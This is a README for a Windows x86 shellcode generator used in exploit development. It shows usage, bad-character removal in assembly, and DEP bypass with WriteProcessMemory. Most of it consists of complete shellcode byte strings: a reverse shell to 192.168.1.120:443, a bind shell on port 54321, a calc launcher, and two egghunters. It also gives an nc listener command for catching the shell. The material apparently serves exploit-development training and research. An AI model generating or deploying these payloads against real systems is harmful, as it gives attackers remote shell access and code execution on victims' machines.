# Windows x86 Shellcode Generator

## Usage

```
$ python3 win_x86_shellcoder.py -h
usage: win_x86_shellcoder.py [-h] [-b BADCHARS] [-r] [-w] [-e {process,thread,none}]
                             {reverse,bind,exec,egghunter,loadfile} ...

Windows x86 Shellcode Generator

positional arguments:
  {reverse,bind,exec,egghunter,loadfile}
                        Shellcode mode
    reverse             Generate reverse shell shellcode
    bind                Generate bind shell shellcode
    exec                Generate execute command shellcode
    egghunter           Generate egghunter shellcode
    loadfile            Load shellcode from file

options:
  -h, --help            show this help message and exit
  -b BADCHARS, --badchars BADCHARS
                        Characters to avoid
  -r, --run_shellcode   Inject shellcode into a current Python process
  -w, --use_windbg      Insert int3 for debugger into shellcode
  -e {process,thread,none}, --exit_func {process,thread,none}
                        Function called to terminate shellcode
```


## Bypass DEP with WriteProcessMemory

This tool was created to facilitate the development of shellcode that does not contain bad characters and does not require decoding to bypass DEP with [WriteProcessMemory](https://docs.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory).

If [VirtualAlloc](https://docs.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) or [VirtualProtect](https://docs.microsoft.com/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) cannot be used and WriteProcessMemory must be used, encoders that perform dynamic decoding such as shikata_ga_nai will likely not work.

It will not work because the address to which WriteProcessMemory writes the shellcode will remain not writable, making it impossible to write dynamically decoded shellcode.

One solution to this problem is to develop a shellcode that does not contain bad characters and does not require decoding.


## Find Bad Characters

`-b` is an option to specify bad characters. The specified bad characters are automatically removed from function name hashes, etc., in shellcode. If any remaining bad characters cannot be removed, the output will indicate which instructions contain bad characters as `[x]`.

```
$ python3 win_x86_shellcoder.py -b '\x00\x0a\x0d\x20\x30' reverse -i 192.168.1.120 -p 443
# shellcode size: 0x151 (337)
...
[ ] 60           : pushal
[ ] 31c9         : xor ecx, ecx
[x] 648b7130     : mov esi, dword ptr fs:[ecx + 0x30]
[ ] 8b760c       : mov esi, dword ptr [esi + 0xc]
[ ] 8b761c       : mov esi, dword ptr [esi + 0x1c]
...
[ ] 8b433c       : mov eax, dword ptr [ebx + 0x3c]
[ ] 8b7c0378     : mov edi, dword ptr [ebx + eax + 0x78]
[ ] 01df         : add edi, ebx
[ ] 8b4f18       : mov ecx, dword ptr [edi + 0x18]
[x] 8b4720       : mov eax, dword ptr [edi + 0x20]
[ ] 01d8         : add eax, ebx
[ ] 8945fc       : mov dword ptr [ebp - 4], eax
...
```


## Remove Bad Characters

We can manually remove the remaining bad characters by replacing the detected instruction with another instruction. For example, 0x20 and 0x30 can be removed by replacing the instructions in [find_and_call.py](coder/find_and_call.py) as follows.

```asm
find_and_call:
    pushad                          // Save all registers
    xor   ecx, ecx                  // ECX = 0
    inc   ecx                       // * FOR BAD CHAR 0x30 *
    mov   esi,fs:[ecx+0x2F]         // ESI = &(PEB) ([FS:0x30])
    dec   ecx                       // * FOR BAD CHAR 0x30 *
    mov   esi,[esi+0x0C]            // ESI = PEB->Ldr
    mov   esi,[esi+0x1C]            // ESI = PEB->Ldr.InInitOrder
...
find_function:
    mov   eax, [ebx+0x3C]           // Offset to PE Signature
    mov   edi, [ebx+eax+0x78]       // Export Table Directory RVA
    add   edi, ebx                  // Export Table Directory VMA
    mov   ecx, [edi+0x18]           // NumberOfNames
    inc   edi                       // * FOR BAD CHAR 0x20 *
    mov   eax, [edi+0x1F]           // AddressOfNames RVA
    dec   edi                       // * FOR BAD CHAR 0x20 *
    add   eax, ebx                  // AddressOfNames VMA
    mov   [ebp-0x4], eax            // Save AddressOfNames VMA for later
```


## Examples

### Reverse Shell

```
$ python3 win_x86_shellcoder.py -b '\x00' reverse -i 192.168.1.120 -p 443
# shellcode size: 0x151 (337)
shellcode = b'\x89\xe5\x81\xc4\xf0\xf9\xff\xff\xeb\x06^\x89u\x04\xebN\xe8\xf5\xff\xff\xff`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1cV\x8b^\x08\x0f\xb6F\x1e\x89E\xf8\x8bC<\x8b|\x03x\x01\xdf\x8bO\x18\x8bG \x01\xd8\x89E\xfc\xe3\x1dI\x8bE\xfc\x8b4\x88\x01\xde1\xc0\x8bU\xf8\xfc\xac\x84\xc0t\x0e\xc1\xca\x02\x01\xc2\xeb\xf4\xeb)^\x8b6\xeb\xbd;T$(u\xd6\x8bW$\x01\xdaf\x8b\x0cJ\x8bW\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89D$ ^aYZQ\xff\xe0\xb8\xb4\xb3\xff\xfe\xf7\xd8Ph32.DhWS2_Thhz\xc4v\xffU\x04\x89\xe01\xc9f\xb9\x90\x05)\xc8P1\xc0f\xb8\x02\x02Ph\x96 \x9e\xcc\xffU\x041\xc0PPP\xb0\x06P,\x05P@Phf ^\x81\xffU\x04\x89\xc61\xc0PPh\xc0\xa8\x01xf\xb8\x01\xbb\xc1\xe0\x10f\x83\xc0\x02PT_1\xc0PPPP\x04\x10PWVh\x95 ^W\xffU\x04VVV1\xc0\x8dH\rP\xe2\xfd\xb0DPT_f\xc7G,\x01\x01\xb8\x9b\x87\x9a\xff\xf7\xd8Phcmd.\x89\xe3\x89\xe01\xc9f\xb9\x90\x03)\xc8PW1\xc0PPP@PHPPSPh\xc7(\xaa\x0b\xffU\x041\xc9Qj\xffh\xd2U\xa9.\xffU\x04'
```

### Bind Shell

```
$ python3 win_x86_shellcoder.py -b '\x00' bind -p 54321
# shellcode size: 0x162 (354)
shellcode = b'\x89\xe5\x81\xc4\xf0\xf9\xff\xff\xeb\x06^\x89u\x04\xebN\xe8\xf5\xff\xff\xff`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1cV\x8b^\x08\x0f\xb6F\x1e\x89E\xf8\x8bC<\x8b|\x03x\x01\xdf\x8bO\x18\x8bG \x01\xd8\x89E\xfc\xe3\x1dI\x8bE\xfc\x8b4\x88\x01\xde1\xc0\x8bU\xf8\xfc\xac\x84\xc0t\x0e\xc1\xca\x05\x01\xc2\xeb\xf4\xeb)^\x8b6\xeb\xbd;T$(u\xd6\x8bW$\x01\xdaf\x8b\x0cJ\x8bW\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89D$ ^aYZQ\xff\xe0\xb8\xb4\xb3\xff\xfe\xf7\xd8Ph32.DhWS2_Th\x92\xacm\xcc\xffU\x04\x89\xe01\xc9f\xb9\x90\x05)\xc8P1\xc0f\xb8\x02\x02Ph\xc8\xcb\xa7;\xffU\x041\xc0PPP\xb0\x06P,\x05P@Ph\x19\xe9\xd9/\xffU\x04\x89\xc61\xc0PPPf\xb8\xd41\xc1\xe0\x10\x04\x02PT_1\xc0\x04\x10PWVhg`\x05\x8b\xffU\x041\xc0PVh\xc9\xc6\xecE\xffU\x041\xc0PPVhOa\x0c\x9a\xffU\x04\x89\xc6VVV1\xc0\x8dH\rP\xe2\xfd\xb0DPT_f\xc7G,\x01\x01\xb8\x9b\x87\x9a\xff\xf7\xd8Phcmd.\x89\xe3\x89\xe01\xc9f\xb9\x90\x03)\xc8PW1\xc0PPP@PHPPSPh\xd9zI\x06\xffU\x041\xc9Qj\xffh\xce\x83\xcbg\xffU\x04'
```


### Execute Command

```
$ python3 win_x86_shellcoder.py -b '\x00' exec -c 'calc'
# shellcode size: 0xb4 (180)
shellcode = b'\x89\xe5\x81\xc4\xf0\xf9\xff\xff\xeb\x06^\x89u\x04\xebN\xe8\xf5\xff\xff\xff`1\xc9d\x8bq0\x8bv\x0c\x8bv\x1cV\x8b^\x08\x0f\xb6F\x1e\x89E\xf8\x8bC<\x8b|\x03x\x01\xdf\x8bO\x18\x8bG \x01\xd8\x89E\xfc\xe3\x1dI\x8bE\xfc\x8b4\x88\x01\xde1\xc0\x8bU\xf8\xfc\xac\x84\xc0t\x0e\xc1\xca\x03\x01\xc2\xeb\xf4\xeb)^\x8b6\xeb\xbd;T$(u\xd6\x8bW$\x01\xdaf\x8b\x0cJ\x8bW\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89D$ ^aYZQ\xff\xe0\xb8\x01\x02\x02\x025\x01\x03\x03\x03Phcalc\x89\xe11\xd2RQhq\x90H\xaa\xffU\x041\xc9Qj\xffh\x97\xaae}\xffU\x04'
```


### Egghunter

#### Use ntaccess

```
$ python3 win_x86_shellcoder.py -b '\x00' egghunter ntaccess -t w00tw00t
# shellcode size: 0x24 (36)
shellcode = b'f\x81\xca\xff\x0fBR\xb8:\xfe\xff\xff\xf7\xd8\xcd.<\x05Zt\xeb\xb8w00t\x89\xd7\xafu\xe6\xafu\xe3\xff\xe7'
```


#### Use SEH

```
$ python3 win_x86_shellcoder.py -b '\x00' egghunter seh -t w00tw00t
# shellcode size: 0x45 (69)
shellcode = b'\xeb*Y\xb8w00tQj\xff1\xdbd\x89#\x83\xe9\x04\x83\xc3\x04d\x89\x0bj\x02Y\x89\xdf\xf3\xafu\x07\xff\xe7f\x81\xcb\xff\x0fC\xeb\xed\xe8\xd1\xff\xff\xffj\x0cY\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06X\x83\xc4\x10P1\xc0\xc3'
```


## Debug Shellcode (for Windows Only)

### Inject shellcode into a Python process

`-r`, `--run_shellcode`

```
python3 win_x86_shellcoder.py -r reverse -i 192.168.1.120 -p 443
```

On 192.168.1.120

```
nc -nlvp 443
```


### Insert int3 for debugger into shellcode

`-w`, `--use_windbg`

```
python3 win_x86_shellcoder.py -r -w reverse -i 192.168.1.120 -p 443
```

